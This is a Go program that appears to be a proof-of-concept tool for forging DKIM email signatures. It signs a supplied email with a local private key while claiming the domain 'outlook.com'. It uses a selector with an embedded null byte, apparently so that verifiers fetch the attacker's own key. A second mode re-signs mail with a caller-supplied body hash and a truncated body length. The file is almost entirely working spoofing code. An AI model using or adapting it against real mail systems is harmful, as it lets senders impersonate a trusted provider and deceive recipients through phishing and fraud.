package main

import (
	"bytes"
	"crypto"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"errors"
	"github.com/emersion/go-msgauth/dkim"
	dkim2 "github.com/esonhugh/go-dkim"
	"go.uber.org/zap"
	"os"
	"strings"
	"time"
)

var log *zap.SugaredLogger

func init() {
	logger, _ := zap.NewProduction()
	defer logger.Sync()
	log = logger.Sugar()
}

// New GetBodyHash
func GetBodyHash() {

}

func main() {
	if len(os.Args) == 3 {
		ReSign()
	} else if len(os.Args) == 2 {
		EmailSignatureSteal()
	}
}

func ReadFile(filename string) ([]byte, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	stat, err := file.Stat()
	if err != nil {
		return nil, errors.Join(errors.New("Error getting file stats"), err)
	}

	size := int(stat.Size())
	data := make([]byte, size)

	_, err = file.Read(data)
	if err != nil {
		return nil, errors.Join(errors.New("Error reading file"), err)
	}
	return data, nil
}

func ImportRSAKeyFromBytes(data []byte) (*rsa.PrivateKey, error) {
	Block, _ := pem.Decode(data)
	if Block == nil {
		return nil, errors.New("Empty Key. Check your key file.")
	}
	return x509.ParsePKCS1PrivateKey(Block.Bytes)
}

func CreateNewBytesMail(filename string, data []byte) error {
	_, err := os.Stat(filename)
	if os.IsExist(err) {
		err = os.Remove(filename)
		if err != nil {
			return errors.Join(errors.New("Error removing file"), err)
		}
	}
	file1, err := os.OpenFile(filename, os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return errors.Join(errors.New("Error creating file"), err)
	}
	defer file1.Close()

	_, err = file1.Write(data)
	if err != nil {
		return errors.Join(errors.New("Error writing to file"), err)
	}
	return nil
}

func CreateNewEmail(data bytes.Buffer) error {
	return CreateNewBytesMail("output.eml", data.Bytes())
}

func ReSign() error {
	options := dkim2.NewSigOptions()
	options.PrivateKey, _ = ReadFile("mail.pem")
	options.Domain = "outlook.com"
	options.Selector = "dkim._domainkey.<your domain>.\x00.any."
	options.SignatureExpireIn = 3600
	options.BodyLength = 50
	options.Headers = []string{"from"}
	options.AddSignatureTimestamp = true
	options.Canonicalization = "relaxed/relaxed"
	options.BodyHash = os.Args[2]
	email, err := ReadFile(os.Args[1])
	err = dkim2.Sign(&email, options)
	if err != nil {
		return errors.Join(errors.New("Error signing email"), err)
	}
	return CreateNewBytesMail("output2.eml", email)
}

func EmailSignatureSteal() {
	// email is the email to sign (byte slice)
	// privateKey the private key (pem encoded, byte slice )
	pkey, err := ReadFile("mail.pem")
	if err != nil {
		log.Fatal("Error reading private key From file", err)
		return
	}
	signer, err := ImportRSAKeyFromBytes(pkey)
	if err != nil {
		log.Fatal("Error importing private key:", err)
		return
	}
	email, err := ReadFile(os.Args[1])
	if err != nil {
		log.Fatal("Reading Raw email Error:", err)
		return
	}

	options := &dkim.SignOptions{
		Domain:                 "outlook.com",
		Selector:               "dkim._domainkey.<your domain>.\x00.any.",
		Signer:                 signer,
		Expiration:             time.Now().Local().Add(time.Hour * 48),
		HeaderKeys:             []string{"from"},
		BodyCanonicalization:   dkim.CanonicalizationRelaxed,
		HeaderCanonicalization: dkim.CanonicalizationRelaxed,
		Hash:                   crypto.SHA256,
		QueryMethods:           []dkim.QueryMethod{dkim.QueryMethodDNSTXT},
		Identifier:             "i",
	}

	r := strings.NewReader(string(email))
	var b bytes.Buffer
	if err := dkim.Sign(&b, r, options); err != nil {
		log.Fatal("DKIM Signature generator error:", err)
		return
	}

	err = CreateNewEmail(b)
	if err != nil {
		log.Fatal("Error creating new email:", err)
		return
	}
	log.Infoln("Email Signature Generated Successfully")

}
